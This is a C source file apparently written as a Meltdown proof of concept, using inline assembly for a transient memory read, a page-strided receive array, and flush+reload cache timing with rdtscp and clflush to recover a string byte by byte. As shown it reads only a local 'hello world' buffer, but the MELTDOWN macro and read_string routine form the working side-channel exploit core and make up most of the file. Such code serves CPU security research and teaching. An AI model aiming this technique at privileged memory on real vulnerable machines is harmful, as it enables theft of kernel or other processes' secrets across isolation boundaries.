/*
	main c file
*/
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "urd00m_output.h"
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

#define DEBUG 1
#define RETRIES 1
#define THRESHOLD 250

// Downside of this implementation, can't read 0 values

// shift by 14 left since you want to mulitply the index by 4096 and sizeof(int)
#define MELTDOWN(addr) \
  asm("1:\n movzx (%%rcx), %%rax\n" \
      "shl $14, %%rax\n" \
      "jz 1b\n" \
      "movq (%%rax, %%rbx, 1), %%rbx\n" \ 
      :						\
      : "c"(addr), "b"(rec)			\
      : "rax");


/*
Helper functions 
 */
static inline void maccess(void *p) {
  asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
}

static void flush(void *p) {
  asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
}

static inline uint64_t rdtscp() {
  uint64_t a = 0, d = 0;
  asm volatile("mfence");
  asm volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");
  a = (d << 32) | a;
  asm volatile("mfence");
  return a;

}

// measures access time, if hit return 1 else return 0;
static inline int flush_reload(void *p) {
  // time access
  register uint64_t start, elapsed; 
  start = rdtscp();
  maccess(p);
  elapsed = rdtscp() - start;
  flush(p);
  return elapsed < THRESHOLD ? 1 : 0;
}


/*
  Global vars 
 */
int* rec; 
char secret[100] = "hello world\n";

/*
  Meltdown setup code 
 */
void init() {
  // setup recieving array
  rec = (int *) malloc(300 * 4096 * sizeof(*rec)); // page stride
  rec = (int *) (((size_t)rec & ~0xfff) + 0x2000);
  memset(rec, 0x00, 4096 * 270 * sizeof(*rec)); // THIS IS NECESSARY OR ELSE FLUSHES TO ONE ADDRESS FLUSH THE WHOLE STRUCTURE
  for(int i = 0; i < 256; i++) {
    flush(&rec[i * 4096]); //flush it from memory 
  }

  INFO("Init finished\n");
}

char* __attribute__((optimize("-Os"), noinline)) read_string(char* addr) {
  char* ret = malloc(100); // 100 characters
  memset(ret, '\0', 100); // 0 out
  size_t size = strlen(addr);

  // get string 
  for(int i = 0; i < size; i++) {
    // hit counter
    int hit[256];
    memset(hit, 0, sizeof(hit));

    // do RETRIES
    for(int j = 0; j < RETRIES; j++) {
      // meltdown attack into cache 
      MELTDOWN(addr);
      
      // flush + reload
      for(int k = 0; k < 256; k++) {
	if(flush_reload(rec + k*4096)) hit[k]++;
      }
    }
    
    // find max
    int max = 0;
    int max_idx = -1;
    for(int j = 0; j < 256; j++) {
      if(hit[j] > max) {
	max = hit[j];
	max_idx = j;
      }
    }
    
    // add ret
    char byte_value = (char)max_idx;
    strncat(ret, &byte_value, 1); //concatenate strings
   
#if DEBUG
    INFO("byte value read: %d\n", max_idx);
#endif
    
    // next byte 
    addr++;
  }
   
  return ret; 
}

/*
  Main function
*/
int main(void) {  
  // create reciever 
  init();  

  /*
  maccess(rec + 60*4096);
  flush((rec + 60*4096));
  int start = rdtscp();
  maccess(rec + 60 * 4096);
  int elapsed = rdtscp() - start; 
  INFO("%d\n", elapsed);
  return 0;
  */
  
  // attempt read
  char *guess = read_string(secret);
  ERROR("String is: %s\n", guess);
  
  return 0;
}
